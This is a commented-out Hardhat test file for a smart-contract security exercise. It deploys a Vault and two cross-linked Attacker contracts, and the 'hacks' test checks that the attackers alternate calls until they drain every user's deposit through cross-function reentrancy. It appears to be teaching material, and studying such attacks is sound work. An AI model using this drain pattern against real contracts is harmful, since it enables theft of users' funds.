// import { loadFixture, ethers, expect } from "./setup";

// describe("ReentrCrossFunction", function () {
//   async function deploy() {
//     const [u1, u2] = await ethers.getSigners();

//     const Vault = await ethers.getContractFactory("Vault");
//     const vault = await Vault.deploy();
//     await vault.waitForDeployment();

//     const Attacker = await ethers.getContractFactory("Attacker");
//     const attacker1 = await Attacker.deploy(vault);
//     await attacker1.waitForDeployment();

//     const attacker2 = await Attacker.deploy(vault);
//     await attacker2.waitForDeployment();

//     const txSetAtt1 = await attacker1.setSecondaryAttacker(attacker2);
//     await txSetAtt1.wait();

//     const txSetAtt2 = await attacker2.setSecondaryAttacker(attacker1);
//     await txSetAtt2.wait();

//     return { u1, u2, vault, attacker1, attacker2 };
//   }

//   it("hacks", async function () {
//     const { u1, u2, vault, attacker1, attacker2 } = await loadFixture(deploy);

//     const valueToDeposit = await attacker1.DEPOSIT_AMOUNT();
//     const userValueToDeposit = valueToDeposit * 3n;

//     const txDeposit1 = await vault
//       .connect(u1)
//       .deposit({ value: userValueToDeposit });
//     await txDeposit1.wait();

//     const txDeposit2 = await vault
//       .connect(u2)
//       .deposit({ value: userValueToDeposit });
//     await txDeposit2.wait();

//     expect(await ethers.provider.getBalance(vault.target)).to.eq(
//       userValueToDeposit * 2n,
//     );

//     const txStep1 = await attacker1.attackStep1({
//       value: valueToDeposit,
//     });
//     await txStep1.wait();

//     const attackersPool = [attacker1, attacker2];

//     let stepN = 1;

//     while ((await ethers.provider.getBalance(vault.target)) > 0) {
//       const nextAttacker = attackersPool[stepN % 2];

//       const txStep2 = await nextAttacker.attackStep2();
//       await txStep2.wait();

//       stepN += 1;
//     }

//     expect(await ethers.provider.getBalance(vault.target)).to.eq(0n);

//     const totalAttBalance =
//       (await ethers.provider.getBalance(attacker1.target)) +
//       (await ethers.provider.getBalance(attacker2.target));

//     expect(totalAttBalance).to.eq(userValueToDeposit * 2n + valueToDeposit);
//   });
// });
